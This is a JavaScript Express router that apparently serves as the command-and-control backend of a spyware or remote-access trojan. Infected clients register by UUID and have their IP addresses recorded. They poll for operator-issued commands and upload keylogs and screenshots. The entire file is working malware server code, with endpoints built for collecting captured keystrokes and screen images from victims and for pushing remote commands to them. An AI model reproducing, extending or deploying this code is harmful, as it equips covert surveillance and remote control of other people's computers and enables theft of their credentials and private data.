'use strict'

const express = require('express')
const router = express.Router()
const clientService = require('../../services/clientService')
const commandService = require('../../services/commandService')
const keylogsService = require('../../services/keylogsService')
const screenshotService = require('../../services/screenshotService')
const ipAddressService = require('../../services/ipAddressService')


//At clients connections
router.put('/:uuid', async (req, res, next) => {
    try {
        const { isNew, data } = await clientService.createOrUpdate({
            uuid: req.params.uuid,
            data: req.body
        })
        const client = await clientService.findOneByUuid(req.params.uuid)
        const { isNewIP, ip_address } = await ipAddressService.createOrUpdate({
            ip: req.ip.split(':')[req.ip.split(':').length - 1],
            clientId: client.id
        })
        res.status(isNew ? 201 : 200).json(data)
    } catch (e) { next(e) }
})

//At clients polling for retriving the commands list
router.get('/:uuid/commands', async (req, res, next) => {
    try {
        const { exists, data } = await commandService.getCommands(req.params.uuid)
        res.status(exists ? 200 : 404).json(data)
    } catch (e) { next(e) }
})

//At adding command
router.post('/:uuid/commands', async (req, res, next) => {
    try {
        const { isAdded, data } = await commandService.addCommand({
            uuid: req.params.uuid,
            data: req.body,
            user: req.session.user
        })
        res.status(isAdded ? 201 : 404).json(data)
    } catch (e) { next(e) }
})

//At clients sending keylogs
router.post('/:uuid/keylogs', async (req, res, next) => {
    try {
        const { isAdded } = await keylogsService.addKeylogs({
            uuid: req.params.uuid,
            data: req.body
        })
        res.status(isAdded ? 201 : 404).json()
    } catch (e) { next(e) }
})

//At clients sending screenshots
router.post('/:uuid/screenshot', async (req, res, next) => {
    try {
        const { isAdded } = await screenshotService.addScreenshot({
            uuid: req.params.uuid,
            data: req.body
        })
        res.status(isAdded ? 201 : 404).json()
    } catch (e) { next(e) }
})

module.exports = router
